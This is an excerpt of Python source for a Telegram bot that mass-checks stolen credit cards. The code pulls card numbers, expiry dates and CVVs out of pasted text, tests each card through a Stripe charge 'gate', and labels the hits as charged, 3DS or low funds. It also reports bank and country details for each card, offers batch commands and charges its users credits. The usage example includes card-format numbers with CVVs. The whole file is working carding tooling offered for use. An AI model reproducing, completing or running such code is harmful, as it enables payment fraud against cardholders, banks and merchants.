...
def extract_cards_from_text(text):
    """Finds CC|MM|YY|CVV in ANY messy text and ignores everything else."""
...
def check_card(cc, session):
    ...
    try:
        ...
        session['net_err'] += 1
        # Append error to full_results
        session['full_results'].append(f"{cc} -> NETWORK_ERROR: {str(e)}")
        return
    ...
    if any(x in last_l for x in ["thank", "success", "Thank you", "Thank You", "complete", "succeeded", "donation"]):
        ...
        session['cvv_err'] += 1
        session['declined'] += 1
    elif any(x in last_l for x in ["network_error", "network error", "proxy_error", "proxy error"]):
        session['net_err'] += 1
    else:
        session['declined'] += 1

    # Anti-Spam / CVV Error Detection
    ...
    # Build a detailed line for the full results file
    bank, country, emoji, scheme, card_type = get_bin_info(cc)
    status_emoji = "❌ DECLINED"
    if is_live:
        if "CHARGED" in st: status_emoji = "✅ CHARGED 🔥"
        elif "3DS" in st: status_emoji = "🔐 3DS / OTP ✅"
        elif "LOW" in st: status_emoji = "🥀 LOW FUNDS"
    elif "security code" in last_l or "cvv" in last_l:
        status_emoji = "❌ CVV ERROR"
    elif "network" in last_l:
        status_emoji = "🌐 NETWORK ERROR"
    else:
        status_emoji = "❌ DECLINED"

    detail_line = f"{cc} | {status_emoji} | {last} | ${amt} | {rt}s"
    session['full_results'].append(detail_line)

    # If verbose mode is on, send a full formatted message for EVERY card
    if session.get('verbose', False):
        msg = f"""<b>CC ☛</b> <code>{cc}</code>
<b>Status ☛</b> {status_emoji}
<b>Gate ☛</b> Stripe Charge ${amt}
<b>Response ☛</b> <i>{last}</i>
<b>❖ BIN ☛</b> <code>{cc[:6]}</code> - {country} {emoji}
<b>❖ Details ☛</b> {scheme}-{card_type}
<b>❖ Bank ☛</b> {bank}
<b>⏱️ Taken ☛</b> {rt}s
<b>🤖 BY:</b> {DEVELOPER}"""
    ...
    # Notification for Live Hits (even if not verbose)
...
def process_card_list(message, card_lines, verbose=False):
    uid = str(message.chat.id)
    ...
    user_sessions[uid] = {
        ...
        'last_cc': 'Wait...',
        'verbose': verbose,
        'full_results': [],   # collect all detailed lines
    }
...
"""
        ...
        # Send full results file if there are any results
        if session['full_results']:
            full_path = f"full_results_{uid}.txt"
            with open(full_path, "w") as f:
                f.write("\n".join(session['full_results']))
            with open(full_path, "rb") as f:
                bot.send_document(message.chat.id, f, caption="📄 Full Results (all cards)")
            os.remove(full_path)

        # Deduct credit only once per batch (already deducted at start of /mass or /massv or file)
        if uid != ADMIN_ID:
...
def mass_check(message):
    ...
    def do_batch():
        process_card_list(message, valid_cards, verbose=False)

    threading.Thread(target=do_batch).start()

@bot.message_handler(commands=["massv"])
def mass_check_verbose(message):
    uid = str(message.chat.id)
    banned, mins = is_banned(uid)
    if banned:
        bot.reply_to(message, f"🚫 Banned for {mins}m")
    ...
    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        bot.reply_to(message, "❌ Usage: /massv [list of cards]\nExample: /massv 4342562493948564|07|28|870 4465421091568137|07|27|851")
        return
    ...
    bot.reply_to(message, f"🚀 Starting VERBOSE batch check for {len(valid_cards)} cards. Each card will send a detailed result.")

    def do_batch():
        process_card_list(message, valid_cards, verbose=True)
